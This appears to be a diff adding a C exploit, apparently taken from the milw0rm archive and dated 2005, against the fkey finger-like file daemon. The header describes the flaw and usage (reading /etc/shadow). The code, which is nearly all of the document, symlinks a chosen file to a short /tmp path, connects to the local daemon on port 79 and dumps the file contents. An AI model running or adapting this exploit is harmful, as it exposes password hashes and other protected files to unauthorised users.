@@ -1,0 +1,100 @@
+/*[ fkey[v0.0.2]: local/remote file accessibility exploit. ]*
+*                                                          *
+* by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)         *
+*                                                          *
+* netris homepage/URL:                                     *
+*  http://www.freshmeat.net/projects/fkey                  *
+*                                                          *
+* compile:                                                 *
+*  gcc xfkey.c -o xfkey                                    *
+*                                                          *
+* syntax:                                                  *
+*  # ./xfkey /etc/shadow 2>~/save_filename                 *
+*                                                          *
+* bug:                                                     *
+*  fkey is a finger-like daemon for accessing remote files *
+*  in a specified directory.  there is no limitations      *
+*  placed on the file acessing other than it must be a     *
+*  filename/path equal to 10 or less bytes.  this limits   *
+*  the remote possibilities somewhat, but symlinking to a  *
+*  short path(ie. /tmp/file) locally can access anything.  *
+*  (this exploits locally)                                 *
+*                                                          *
+* note:                                                    *
+*  this is pretty low-risk due to the fact that the        *
+*  program isn't very common, just browsing freshmeat.net  *
+*  and killing some time.                                  *
+************************************************************/
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <strings.h>
+#include <signal.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#define TMPFILE "/tmp/xfkey" /* must be 10 characters or less. */
+
+void fkey_connect(unsigned short);
+void printe(char *,short);
+void sig_alarm(){printe("alarm/timeout hit.",1);}
+
+int main(int argc,char **argv){
+unsigned short port=79;
+if(argc<2){
+ printf("[!] syntax: %s <file> [port]\n",argv[0]);
+ exit(1);
+}
+if(argc>2)port=atoi(argv[2]);
+unlink(TMPFILE);
+if(symlink(argv[1],TMPFILE))
+ printe("symlink() failed.",1);
+fkey_connect(port);
+unlink(TMPFILE);
+exit(0);
+}
+void fkey_connect(unsigned short port){
+int sock=0,l=0,m=0;
+char buf[1024+1];
+struct hostent *t;
+struct sockaddr_in s;
+sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+s.sin_family=AF_INET;
+s.sin_port=htons(port);
+printf("[*] attempting to connect: localhost:%u.\n",port);
+if((s.sin_addr.s_addr=inet_addr("127.0.0.1"))){
+ if(!(t=gethostbyname("localhost")))
+  printe("couldn't resolve hostname.",1);
+ memcpy((char*)&s.sin_addr,(char*)t->h_addr,
+ sizeof(s.sin_addr));
+}
+signal(SIGALRM,sig_alarm);
+alarm(3);
+if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
+ printe("connection failed.",1);
+alarm(0);
+printf("[*] successfully connected: localhost:%u.\n",port);
+write(sock,TMPFILE,strlen(TMPFILE));
+alarm(5);
+for(memset(buf,0,1025);(l=read(sock,buf,1024));memset(buf,0,1025)){
+ fputs(buf,stderr);
+ m+=l;
+}
+alarm(0);
+if(m<=0)
+ printe("exploit failed, file doesn't exist or zero-length file.",0);
+close(sock);
+return;
+}
+void printe(char *err,short e){
+printf("[!] %s\n",err);
+if(e)exit(1);
+return;
+}
+
+// milw0rm.com [2005-01-20]
